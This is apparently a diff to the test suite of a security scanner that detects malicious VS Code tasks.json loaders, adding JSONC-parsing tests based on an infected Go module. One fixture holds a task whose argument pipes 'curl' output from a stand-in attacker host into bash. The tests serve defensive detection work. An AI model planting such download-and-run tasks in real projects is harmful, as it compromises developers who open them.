@@ -178,10 +178,34 @@ describe("EDITOR_TASK_EXECUTES_ASSET", () => {
     expect(rulesOf({ label: "t", type: "shell", runOptions: { runOn: "folderOpen" }, ...task })).toEqual([]);
   });
 
+  // The real loader file is JSONC: it ends its task list with a trailing comma,
+  // which VS Code accepts and strict JSON.parse rejects. Every fixture above is
+  // built with JSON.stringify and therefore cannot carry that comma; this text
+  // copies the real file's closing lines, the shape that scanned clean on the
+  // actual infected Go proxy zips until the parser read JSONC.
+  const REAL_SHAPE =
+    JSON.stringify({ version: "2.0.0", tasks: [FAKE_FONT_TASK] }, null, 2).replace(/\n  \]\n\}$/, ",\n  ]\n}\n");
+
+  it("reads the real loader's JSONC (trailing comma)", () => {
+    expect(REAL_SHAPE).toMatch(/\},\n {2}\]\n\}\n$/);
+    expect(() => JSON.parse(REAL_SHAPE)).toThrow();
+    expect(
+      scanEditorTasksContent(REAL_SHAPE, ".vscode/tasks.json").map((f) => `${f.rule}:${f.severity}`),
+    ).toEqual(["EDITOR_TASK_EXECUTES_ASSET:critical"]);
+  });
+
+  it("reads JSONC comments for the older task rules too", () => {
+    const content =
+      '{\n  // setup\n  "version": "2.0.0",\n  "tasks": [\n    { "label": "s", "type": "shell", "command": "bash", "args": ["-c", "curl -s https://evil.example.net/p.sh | bash"], },\n  ],\n}\n';
+    expect(scanEditorTasksContent(content, ".vscode/tasks.json").map((f) => f.rule)).toEqual([
+      "EDITOR_TASK_DOWNLOAD_EXEC",
+    ]);
+  });
+
   it("is reported by a directory scan of an infected checkout", async () => {
     const dir = fixture("fake-font-loader", {
       "go.mod": "module example.com/victim\n\ngo 1.22\n",
-      ".vscode/tasks.json": JSON.stringify({ version: "2.0.0", tasks: [FAKE_FONT_TASK] }, null, 2),
+      ".vscode/tasks.json": REAL_SHAPE,
       "public/fonts/fa-solid-400.woff2": " ".repeat(64) + "void 0;\n",
     });
     const report = await scan({ target: dir, format: "json" });
